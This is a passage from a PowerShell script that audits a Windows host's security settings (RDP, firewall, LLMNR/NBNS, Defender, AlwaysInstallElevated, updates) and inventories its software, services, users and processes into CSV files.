            $strAuditCheckResult='RDP is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
			

         }
         '0' 
         {
            $strAuditCheckResult='RDP is enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
			
			### Check if TLS is enabled
			# Security Layer 0 – With a low security level, the remote desktop protocol is used by the client for authentication prior to a remote desktop connection being established. Use this setting if you are working in an isolated environment.
			# Security Layer 1 – With a medium security level, the server and client negotiate the method for authentication prior to a Remote Desktop connection being established. As this is the default value, use this setting only if all your machines are running Windows.
			# Security Layer 2 - With a high security level, Transport Layer Security, better knows as TLS is used by the server and client for authentication prior to a remote desktop connection being established. 
			Write-Host 'Checking if RDP enforces the use of TLS' -ForegroundColor Black -BackgroundColor White
			$strSecurityItemCheck = "RDP enforce the use of TLS"
			$regPath = "HKLM:\\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
			$regPathProperty = "SecurityLayer"
			
			
			if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
				$secLayerValue= (Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue)
				
				if($secLayerValue -eq 2){
					$strAuditCheckResult="RDP service enforces the use of TLS"
					Write-Host $strAuditCheckResult -ForegroundColor Green
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
				} else {
					$strAuditCheckResult="RDP service does not enforce the use of TLS"
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				}
			} else {
				$strAuditCheckResult="(Default) RDP service enforces the use of TLS upon connection"
				Write-Host $strAuditCheckResult -ForegroundColor Green
				Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
			}
			
			### Check if NLA is enabled
			# UserAuthentication 1 -> NLA active
			# UserAuthentication 0 -> NLA not active
			Write-Host 'Checking if RDP enforces the use of NLA' -ForegroundColor Black -BackgroundColor White
			$strSecurityItemCheck = "RDP enforce the use of NLA"
			$regPath = "HKLM:\\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
			$regPathProperty = "UserAuthentication"
			if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
				$secLayerValue= (Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue)
				
				if($secLayerValue -eq 1){
					$strAuditCheckResult="RDP service enforces the use of Network Level Authentication (NLA)"
					Write-Host $strAuditCheckResult -ForegroundColor Green
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
				} else {
					$strAuditCheckResult="RDP service does not enforce the use of Network Level Authentication (NLA)"
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				}
			} else {
				$strAuditCheckResult="(Default) RDP service enforces the use of NLA upon connection"
				Write-Host $strAuditCheckResult -ForegroundColor Green
				Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
			}
			
			### Encryption level
			# Security Layer 1 – With a low security level, communications sent from the client to the server are encrypted using 56-bit encryption. Data sent from the server to the client is not encrypted. This setting is not recommended as you can be exposed to various attacks.
			# Security Layer 2 – Having a client compatible security level, communications between the server and the client are encrypted at the maximum key strength supported by the client. Use this level when the Terminal Server is running in an environment containing mixed or legacy clients as this is the default setting on your OS.
			# Security Layer 3 – With a high security level, communications between server and client are encrypted using 128-bit encryption. Use this level when the clients that access the Terminal Server also support 128-bit encryption. If this option is set, clients that do not support 128-bit encryption will not be able to connect.
			# Security Layer 4 – This security level is FIPS-Compliant, meaning that all communication between the server and client are encrypted and decrypted with the Federal Information Processing Standard (FIPS) encryption algorithms. Use this setting for maximum security but only if both machines support this type of encryption.
			Write-Host 'Checking the encryption level enforced by RDP' -ForegroundColor Black -BackgroundColor White			
			$strSecurityItemCheck = "Encryption level enforced by RDP"
			$regPath = "HKLM:\\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
			$regPathProperty = "MinEncryptionLevel"
			
			
			if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
				$encryptionLevelValue= (Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue)
				
				if($encryptionLevelValue -eq 4){
					$strAuditCheckResult="FIPS-Compliant, meaning that all communication between the server and client are encrypted and decrypted with the Federal Information Processing Standard (FIPS) encryption algorithms"
					Write-Host $strAuditCheckResult -ForegroundColor Green
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
				} elseif($encryptionLevelValue -eq 3){
					$strAuditCheckResult="Communications between server and client are encrypted using 128-bit encryption"
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				} elseif($encryptionLevelValue -eq 2){
					$strAuditCheckResult="Client compatible security level, communications between the server and the client are encrypted at the maximum key strength supported by the client"
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				} elseif($encryptionLevelValue -eq 1){
					$strAuditCheckResult="Communications sent from the client to the server are encrypted using 56-bit encryption. Data sent from the server to the client is not encrypted."
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				} 
				else {
					$strAuditCheckResult="(Default) Client compatible security level, communications between the server and the client are encrypted at the maximum key strength supported by the client"
					Write-Host $strAuditCheckResult -ForegroundColor Red
					Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
				}
			} else {
				$strAuditCheckResult="RDP service enforces the use of TLS upon connection"
				Write-Host $strAuditCheckResult -ForegroundColor Green
				Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
			}	
         }
     }
 } else {
    $strSecurityItemCheck = "RDP should be disabled"
	$strAuditCheckResult='RDP is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


####################### Windows Firewall ###################################################
$strSecurityItem = "Windows Firewall - Private Profile"
$strSecurityItemCheck = "Private Profile - Firewall should be enabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##   Windows Firewall  ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking Firewall State' -ForegroundColor Black -BackgroundColor White
$regkey = "HKLM:\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"

If ((Get-ItemProperty $regkey\StandardProfile).EnableFirewall -eq 1){
    $strSecurityItem = "Windows Firewall - Private Profile"
    $strSecurityItemCheck = "Private Profile - Firewall should be enabled"
    $strAuditCheckResult='Private Profile - Firewall is enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
}Else {
    $strSecurityItem = "Windows Firewall - Private Profile"
    $strSecurityItemCheck = "Private Profile - Firewall should be enabled"
    $strAuditCheckResult='Private Profile - Firewall is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}

If ((Get-ItemProperty $regkey\DomainProfile).EnableFirewall -eq 1){
    $strSecurityItem = "Windows Firewall - Domain Profile"
    $strSecurityItemCheck = "Domain Profile - Firewall should be enabled"
    $strAuditCheckResult='Domain Profile - Firewall is enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
}Else {
    $strSecurityItem = "Windows Firewall - Domain Profile"
    $strSecurityItemCheck = "Domain Profile - Firewall should be enabled"
    $strAuditCheckResult='Domain Profile - Firewall is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}

If ((Get-ItemProperty $regkey\PublicProfile).EnableFirewall -eq 1){
    $strSecurityItem = "Windows Firewall - Public Profile"
    $strSecurityItemCheck = "Public Profile - Firewall should be enabled"
    $strAuditCheckResult='Public Profile - Firewall is enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
}Else {
    $strSecurityItem = "Windows Firewall - Public Profile"
    $strSecurityItemCheck = "Public Profile - Firewall should be enabled"
    $strAuditCheckResult='Public Profile - Firewall is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}

Write-Host 'Exporting Windows Firewall Rules to CSV-file'
Get-NetFirewallRule | Select-Object -Property Name, DisplayName, DisplayGroup, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},
@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action | 
Export-Csv -Path ".\CSV\Windows Firewall Rules.csv" -NoTypeInformation 

####################### LLMNR ###################################################
$strSecurityItem = "Man-in-the-Middle Attacks - LLMNR"
$strSecurityItemCheck = "LLMNR should be disabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##        LLMNR        ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Check if LLMNR is enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\Software\Policies\Microsoft\Windows NT\DNSClient"
$regPathProperty = "EnableMulticast"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='LLMNR is enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '0' 
         {
            $strAuditCheckResult='LLMNR is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
     }
 } else {
    $strAuditCheckResult='LLMNR is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


 ####################### NBNS ###################################################
 $strSecurityItem = "Man-in-the-Middle Attacks - NBNS" #ToDo
 $strSecurityItemCheck = "NBNS should be disabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##        NBNS         ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Check if NBNS is enabled' -ForegroundColor Black -BackgroundColor White
$regPath="HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"

Get-ChildItem $regPath | ForEach-Object { 
    get-ItemProperty -Path "$regPath\$($_.pschildname)" -Name NetbiosOptions} | Format-Table NetBiosOptions,@{Name='Interface';Expression={$_.PSChildname}
}

Write-Host '0 - Configuration via DHCP' -ForegroundColor Red
Write-Host '1 - Specifies that NetBIOS is enabled.' -ForegroundColor Red
Write-Host '2 - NetBIOS is disabled' -ForegroundColor Green



# Mitigation:
# $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
# Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
# http://woshub.com/how-to-disable-netbios-over-tcpip-and-llmnr-using-gpo/#h2_4


####################### WPAD ################################################# TODO
## TODO #https://www.powershellgallery.com/packages/Get-InternetAccessInfo/0.2/Content/Get-InternetAccessInfo.psm1
## Problem -> we run in context of an admin user and not a regular user... 
### This check should be run as regular user
$strSecurityItem = "Man-in-the-Middle Attacks - LLMNR"
$strSecurityItemCheck = "WPAD should be disabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##        WPAD         ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Check if WPAD is disabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\Software\Policies\Microsoft\Windows NT\DNSClient"
$regPathProperty = "EnableMulticast"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            #$strAuditCheckResult='LLMNR is enabled'
            #Write-Host $strAuditCheckResult -ForegroundColor Red
            #Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '0' 
         {
            #$strAuditCheckResult='LLMNR is disabled'
            #Write-Host $strAuditCheckResult -ForegroundColor Green
            #Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
     }
 } else {
    #$strAuditCheckResult='LLMNR is disabled'
    #Write-Host $strAuditCheckResult -ForegroundColor Red
    #Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


####################### Logs ################################################# TODO
<#
Resources:
    Get-EventLog: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
    Recommended settings for event log sizes in Windows: https://support.microsoft.com/en-us/help/957662/recommended-settings-for-event-log-sizes-in-windows
    Hey, Scripting Guy! How Can I Check the Size of My Event Log and Then Backup and Archive It If It Is More Than Half Full?: https://blogs.technet.microsoft.com/heyscriptingguy/2009/04/08/hey-scripting-guy-how-can-i-check-the-size-of-my-event-log-and-then-backup-and-archive-it-if-it-is-more-than-half-full/
    Is there a log file for RDP connections?: https://social.technet.microsoft.com/Forums/en-US/cb1c904f-b542-4102-a8cb-e0c464249280/is-there-a-log-file-for-rdp-connections?forum=winserverTS
    WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later: https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5760096ecf80a129e0b17634/1465911664070/Windows+PowerShell+Logging+Cheat+Sheet+ver+June+2016+v2.pdf0
#>
$strSecurityItem = "Logging - Maximum Log Size"
$strSecurityItemCheck = "Checking maximum log sizes"
Write-Host '#####################################' -BackgroundColor Black
Write-Host '##        Maximum Log Size         ##' -BackgroundColor Black
Write-Host '#####################################' -BackgroundColor Black
Write-Host $strSecurityItemCheck -ForegroundColor Black -BackgroundColor White

Get-WmiObject -Class Win32_NTEventLogFile |
	Select-Object LogfileName,
				  Status,
				  Name,
				  NumberOfRecords,
				  @{Name="FileSize in MB"; Expression={[math]::Round($_.FileSize / 1024 /1024) }}, 
				  @{Name="MaxFileSize in MB"; Expression={[math]::Round($_.MaxFileSize / 1024 / 1024)}} |
	Sort-Object -Property NumberOfRecords  -Descending |
Format-Table -AutoSize

Get-WmiObject -Class Win32_NTEventLogFile |
	Select-Object LogfileName,
				  Status,
				  Name,
				  NumberOfRecords,
				  @{Name="FileSize in MB"; Expression={[math]::Round($_.FileSize / 1024 /1024) }}, 
				  @{Name="MaxFileSize in MB"; Expression={[math]::Round($_.MaxFileSize / 1024 / 1024)}} |
	Sort-Object -Property NumberOfRecords  -Descending |
 Export-Csv -Path ".\CSV\Logging Overview.csv" -NoTypeInformation


####################### AV ###################################################
# https://www.windowscentral.com/how-manage-microsoft-defender-antivirus-powershell-windows-10
$strSecurityItem = "Malware Protection - AV" #ToDo
$strSecurityItemCheck = "An AV solution should be installed and active"
Write-Host '#########################' -BackgroundColor Black
Write-Host '#    Windows Defender  ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
$defenderPreferences = Get-MpPreference

if(-not ($defenderPreferences.DisableRealtimeMonitoring)){
    $strAuditCheckResult='Defender is active'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 } else {
    $strAuditCheckResult='Defender is not active'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }
####################### Windows Installer ###################################################
 $strSecurityItem = "Malware Protection - Hardening" #ToDo
 $strSecurityItemCheck = "Windows Installer Always install with elevated privileges"
 Write-Host '#################################' -BackgroundColor Black
 Write-Host '##      Windows Installer      ##' -BackgroundColor Black
 Write-Host '#################################' -BackgroundColor Black
 Write-Host 'Checking if Windows installer allows elevated privileges to standard users' -ForegroundColor Black -BackgroundColor White
 $regPath = "HKLM:\\SOFTWARE\Policies\Microsoft\Windows\Installer\"
 $regPathProperty = "AlwaysInstallElevated"
 
 if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
     $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
     Switch($check)
     {
          '1' 
          {
            $strAuditCheckResult='Windows installer allows elevated privileges to standard users - AlwaysInstallElevated is enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
          }
          '0' 
          {
            $strAuditCheckResult='Windows installer denies elevated privileges to standard users - AlwaysInstallElevated is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
          }
      }
  } else {
    $strAuditCheckResult='(default) Windows installer denies elevated privileges to standard users - AlwaysInstallElevated is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
  }

 ####################### Installed Software ###################################################
Write-Host '##########################' -BackgroundColor Black
Write-Host '##  Installed Software  ##' -BackgroundColor Black
Write-Host '##########################' -BackgroundColor Black
Write-Host 'Getting a list of installed Software:' -ForegroundColor Black -BackgroundColor White
Get-WMIObject -Query "SELECT * FROM Win32_Product" | Select-Object Name,Version,Vendor,InstallLocation,InstallDate | format-table


Write-Host 'Exporting installed software to CSV-File'
Get-WMIObject -Query "SELECT * FROM Win32_Product" | Select-Object Name,Version,Vendor,InstallLocation,InstallDate | Export-Csv -Path ".\CSV\Installed Software.csv" -NoTypeInformation 

Write-Host 'Getting a list of installed Software:' -ForegroundColor Black -BackgroundColor White
Get-WindowsOptionalFeature -Online | where-object {$_.State -eq "Enabled"} | Sort-Object FeatureName| Format-Table *
Get-WindowsOptionalFeature -Online | where-object {$_.State -eq "Enabled"} | Sort-Object FeatureName| Export-Csv -Path ".\CSV\Windows Features.csv" -NoTypeInformation 

Write-Host 'Getting a list of installed updates:' -ForegroundColor Black -BackgroundColor White
get-wmiobject -class win32_quickfixengineering | Sort-Object installedOn | Export-Csv -Path ".\CSV\Windows Updates.csv" -NoTypeInformation

####################### Windows Update ###################################################
$strSecurityItem = "Malware Protection - Windows Update" #ToDo
$strSecurityItemCheck = "Auto Update should be enabled"
Write-Host '#################################' -BackgroundColor Black
Write-Host '##      Windows Updates      ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
Write-Host 'Checking if Automatic Updates are enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\Au\"
$regPathProperty = "NoAutoUpdate"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
           $strAuditCheckResult='Automatic Updates are disabled'
           Write-Host $strAuditCheckResult -ForegroundColor Red
           Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
           $booAutoUpdate=$false
         }
         '0' 
         {
           $strAuditCheckResult='Automatic Updates are enabled'
           Write-Host $strAuditCheckResult -ForegroundColor Green
           Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
           $booAutoUpdate=$true
         }
     }
 } else {
    $strAuditCheckResult='Automatic Updates are enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
    $booAutoUpdate=$true
 }

 if($booAutoUpdate){
    $strSecurityItemCheck = "Auto Update configuration"
    Write-Host 'Checking if Automatic Update configuration' -ForegroundColor Black -BackgroundColor White
    $regPath = "HKLM:\\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\Au\"
    $regPathProperty = "AUOptions"

    if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
        $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
        Switch($check)
        {
             '1' 
             {
               $strAuditCheckResult='Keep my computer up to date is disabled in Automatic Updates.'
               Write-Host $strAuditCheckResult -ForegroundColor Red
               Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
             }
             '2' 
             {
               $strAuditCheckResult='Notify of download and installation.'
               Write-Host $strAuditCheckResult -ForegroundColor Red
               Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
             }
             '3' 
             {
               $strAuditCheckResult='Automatically download and notify of installation.'
               Write-Host $strAuditCheckResult -ForegroundColor Red
               Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
             }
             '4' 
             {
               $strAuditCheckResult='Automatically download and scheduled installation.'
               Write-Host $strAuditCheckResult -ForegroundColor Green
               Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
             }
         }
     } else {
        $strAuditCheckResult='(Default) Automatically download and notify of installation.'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
     }
 }
 
####################### Network services ###################################################
Write-Host '##################################' -BackgroundColor Black
Write-Host '##  Listening network services  ##' -BackgroundColor Black
Write-Host '##################################' -BackgroundColor Black

# Make a lookup table by process ID
$Processes = @{}
Get-Process -IncludeUserName | ForEach-Object {
    $Processes[$_.Id] = $_
}

# Query Listening TCP Daemons
Write-Host "TCP Listening Services" -ForegroundColor Black -BackgroundColor White
Get-NetTCPConnection | 
    Where-Object { $_.State -eq "Listen" } |
    Select-Object LocalAddress,
        LocalPort,
        @{Name="PID";         Expression={ $_.OwningProcess }},
        @{Name="UserName";    Expression={ $Processes[[int]$_.OwningProcess].UserName }},
        @{Name="ProcessName"; Expression={ $Processes[[int]$_.OwningProcess].ProcessName }}, 
        @{Name="Path"; Expression={ $Processes[[int]$_.OwningProcess].Path }} |
    Sort-Object -Property LocalPort, UserName |
    Format-Table -AutoSize

    Get-NetTCPConnection | 
    Where-Object { $_.State -eq "Listen" } |
    Select-Object LocalAddress,
        LocalPort,
        @{Name="PID";         Expression={ $_.OwningProcess }},
        @{Name="UserName";    Expression={ $Processes[[int]$_.OwningProcess].UserName }},
        @{Name="ProcessName"; Expression={ $Processes[[int]$_.OwningProcess].ProcessName }}, 
        @{Name="Path"; Expression={ $Processes[[int]$_.OwningProcess].Path }} |
    Sort-Object -Property LocalPort, UserName | Export-Csv -Path ".\CSV\Network Services - TCP.csv" -NoTypeInformation 


# Query Listening UDP Daemons
Write-Host "UDP Listening Services" -ForegroundColor Black -BackgroundColor White
Get-NetUDPEndpoint | 
	Where-Object { -not ($_.LocalAddress -eq "127.0.0.1") } |
	Select-Object LocalAddress,
		LocalPort,
		@{Name="PID";         Expression={ $_.OwningProcess }},
		@{Name="UserName";    Expression={ $Processes[[int]$_.OwningProcess].UserName }},
		@{Name="ProcessName"; Expression={ $Processes[[int]$_.OwningProcess].ProcessName }}, 
		@{Name="Path"; Expression={ $Processes[[int]$_.OwningProcess].Path }} |
	Sort-Object -Property LocalPort, UserName |
Format-Table -AutoSize


Write-Host "UDP Listening Services" -ForegroundColor Black -BackgroundColor White
Get-NetUDPEndpoint | 
	Where-Object { -not ($_.LocalAddress -eq "127.0.0.1") } |
	Select-Object LocalAddress,
		LocalPort,
		@{Name="PID";         Expression={ $_.OwningProcess }},
		@{Name="UserName";    Expression={ $Processes[[int]$_.OwningProcess].UserName }},
		@{Name="ProcessName"; Expression={ $Processes[[int]$_.OwningProcess].ProcessName }}, 
		@{Name="Path"; Expression={ $Processes[[int]$_.OwningProcess].Path }} |
	Sort-Object -Property LocalPort, UserName | Export-Csv -Path ".\CSV\Network Services - UDP.csv" -NoTypeInformation 


####################### Local Users ###################################################
Write-Host '###################' -BackgroundColor Black
Write-Host '##  Local Users  ##' -BackgroundColor Black
Write-Host '###################' -BackgroundColor Black
Write-Host "Local Users and their group memberships" -ForegroundColor Black -BackgroundColor White

$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$adsi.Children | where {$_.SchemaClassName -eq 'user'} | Foreach-Object {
    $groups = $_.Groups() | Foreach-Object {$_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)}
    $_ | Select-Object @{n='UserName';e={$_.Name}},
					   @{n='SID';e={((New-Object System.Security.Principal.SecurityIdentifier($_.objectSid.value,0)).Value)}},
					   @{n='LastLogin';e={$_.LastLogin}},
					   @{n='Groups';e={$groups -join ';'}},
					   @{n='UserFlags';e={(Convert-UserFlag $_.UserFlags.value)}},
					   @{n='Description';e={$_.Description}}
} | Sort-Object SID | Format-Table -Wrap -AutoSize

$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$adsi.Children | where {$_.SchemaClassName -eq 'user'} | Foreach-Object {
    $groups = $_.Groups() | Foreach-Object {$_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)}
    $_ | Select-Object @{n='UserName';e={$_.Name}},
					   @{n='SID';e={((New-Object System.Security.Principal.SecurityIdentifier($_.objectSid.value,0)).Value)}},
					   @{n='LastLogin';e={$_.LastLogin}},
					   @{n='Groups';e={$groups -join ';'}},
					   @{n='UserFlags';e={(Convert-UserFlag $_.UserFlags.value)}},
					   @{n='Description';e={$_.Description}}
} | Sort-Object SID | Export-Csv -Path ".\CSV\Users.csv" -NoTypeInformation 

####################### Processes ###################################################
Write-Host '###################' -BackgroundColor Black
Write-Host '##   Processes   ##' -BackgroundColor Black
Write-Host '###################' -BackgroundColor Black
Write-Host "Running processes" -ForegroundColor Black -BackgroundColor White
$Results = Get-ProcessInfo
$Results | Format-Table Name, Owner, ID, Path, CommandLine -auto 
